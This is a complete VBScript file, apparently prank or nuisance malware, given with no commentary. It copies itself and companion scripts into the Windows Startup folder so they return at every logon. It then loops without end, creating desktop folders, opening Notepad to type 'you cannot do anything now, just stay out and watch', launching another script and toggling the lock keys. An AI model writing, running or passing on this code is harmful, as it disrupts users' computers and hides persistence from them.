Dim objFS, objFile
set wshshell = wscript.createobject("wscript.shell")
Desktop = WshShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\" & "Desktop"
Set fso = CreateObject("Scripting.FilesystemObject")
a = wshShell.CurrentDirectory

wshshell.run a &"\matrix.bat", 5
If fso.FolderExists(desktop & "\1") Then

Else
wshshell.run a &"\n.bat", 5
End If

Dim StartupFolder
StartupFolder = WshShell.SpecialFolders("Startup")
fso.CopyFile a & "\Setup.vbs", "" & StartupFolder & "\"
fso.CopyFile a & "\matrix.bat", "" & StartupFolder & "\"
fso.CopyFile a & "\c.vbs", "" & StartupFolder & "\"


WScript.Sleep(3000)


dim j
j=0
do
j=j+1

set wshshell = wscript.createobject("wscript.shell")
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objFile = objFS.CreateFolder(desktop &"\j")

wshshell.run "%windir%\notepad", 5

wshshell.sendkeys "you cannot do anything now, just stay out and watch."
wshshell.AppActivate "notepad"

wshshell.run a &"\c.vbs"
wshshell.sendkeys "{CAPSLOCK}"
wshshell.sendkeys "{NUMLOCK}"
wshshell.sendkeys "{SCROLLLOCK}"

objFile.name = j
loop